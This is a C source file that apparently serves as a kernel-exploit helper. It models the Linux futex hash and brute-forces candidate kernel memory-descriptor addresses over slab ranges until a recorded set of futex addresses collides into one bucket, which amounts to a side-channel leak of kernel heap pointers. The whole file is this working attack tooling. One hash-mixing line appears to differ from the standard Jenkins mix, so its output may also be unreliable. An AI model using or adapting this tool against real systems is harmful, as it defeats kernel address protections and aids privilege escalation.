#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define rol32(x, n) (((x) << ((n) & 31)) | ((x) >> (32 - (n))))

static void jhash_mix(uint32_t *a, uint32_t *b, uint32_t *c) {
  *a -= *c; *a ^= rol32(*c, 4);  *c += *b;
  *b -= *a; *b ^= rol32(*a, 6);  *a += *c;
  *c -= *b; *c ^= rol32(*a, 8);  *b += *a;
  *a -= *c; *a ^= rol32(*c, 16); *c += *b;
  *b -= *a; *b ^= rol32(*a, 19); *a += *c;
  *c -= *b; *c ^= rol32(*b, 4);  *b += *a;
}

static void jhash_final(uint32_t *a, uint32_t *b, uint32_t *c) {
  *c ^= *b; *c -= rol32(*b, 14);
  *a ^= *c; *a -= rol32(*c, 11);
  *b ^= *a; *b -= rol32(*a, 25);
  *c ^= *a; *c -= rol32(*a, 16);
  *a ^= *b; *a -= rol32(*b, 4);
  *b ^= *c; *b -= rol32(*c, 14);
  *c ^= *a; *c -= rol32(*a, 24);
}

static uint32_t futex_hash(uint64_t addr, uint64_t mm, uint32_t mask) {
  uint32_t a = 0xdeadbeef + (4u << 2) + (uint32_t)(addr & 0xfff);
  uint32_t b = a, c = a;
  a += (uint32_t)mm;
  b += (uint32_t)(mm >> 32);
  c += (uint32_t)(addr & ~0xfffULL);
  jhash_mix(&a, &b, &c);
  a += (uint32_t)((addr & ~0xfffULL) >> 32);
  jhash_final(&a, &b, &c);
  return c & mask;
}

int main(int argc, char **argv) {
  if (argc < 7) {
    fprintf(stderr, "usage: %s collisions.txt start end slab_size slab_order mask [min_hits]\n", argv[0]);
    return 2;
  }
  uint64_t addrs[8192];
  size_t count = 0;
  FILE *f = fopen(argv[1], "r");
  if (!f) { perror("open"); return 1; }
  char line[256];
  while (fgets(line, sizeof(line), f) && count < 8192) {
    if (strncmp(line, "futex_addr=", 11)) continue;
    uint64_t addr = strtoull(line + 11, NULL, 0);
    int dup = 0;
    for (size_t i = 0; i < count; ++i) if (addrs[i] == addr) { dup = 1; break; }
    if (!dup) addrs[count++] = addr;
  }
  fclose(f);
  if (count < 2) return 1;

  uint64_t start = strtoull(argv[2], NULL, 0);
  uint64_t end = strtoull(argv[3], NULL, 0);
  uint64_t obj_sz = strtoull(argv[4], NULL, 0);
  uint64_t order = strtoull(argv[5], NULL, 0);
  uint32_t mask = strtoul(argv[6], NULL, 0);
  size_t min_hits = argc > 7 ? strtoul(argv[7], NULL, 0) : count - 1;
  uint64_t slab_sz = (uint64_t)4096 << order;
  if (!obj_sz || !slab_sz || end <= start) return 1;
  size_t per_slab = (size_t)(slab_sz / obj_sz);
  if (!per_slab) return 1;
  start &= ~(slab_sz - 1);

  size_t found = 0, best_hits = 0;
  uint64_t best_mm = 0;
  uint32_t best_bucket = 0;
#pragma omp parallel for schedule(static) reduction(+:found) reduction(max:best_hits)
  for (int64_t bi = 0; bi < (int64_t)((end - start) / slab_sz); ++bi) {
    uint64_t base = start + (uint64_t)bi * slab_sz;
    for (size_t k = 0; k < per_slab; ++k) {
      uint64_t mm = base + (uint64_t)k * obj_sz;
      uint32_t counts[2048];
      memset(counts, 0, sizeof(counts));
      for (size_t i = 0; i < count; ++i)
        counts[futex_hash(addrs[i], mm, mask)]++;
      uint32_t b = futex_hash(addrs[0], mm, mask);
      if (counts[b] >= min_hits) {
#pragma omp critical
        {
          printf("HIT MM=0x%016llx BUCKET=%u HITS=%zu/%zu\n",
                 (unsigned long long)mm, b, counts[b], count);
          for (size_t i = 0; i < count; ++i)
            if (futex_hash(addrs[i], mm, mask) == b)
              printf("  0x%016llx\n", (unsigned long long)addrs[i]);
          fflush(stdout);
        }
        ++found;
        if (counts[b] > best_hits) {
          best_hits = counts[b];
          best_mm = mm;
          best_bucket = b;
        }
      }
    }
  }
  fprintf(stderr, "BEST MM=0x%016llx BUCKET=%u HITS=%zu/%zu FOUND=%zu\n",
          (unsigned long long)best_mm, best_bucket, best_hits, count, found);
  return found ? 0 : 3;
}
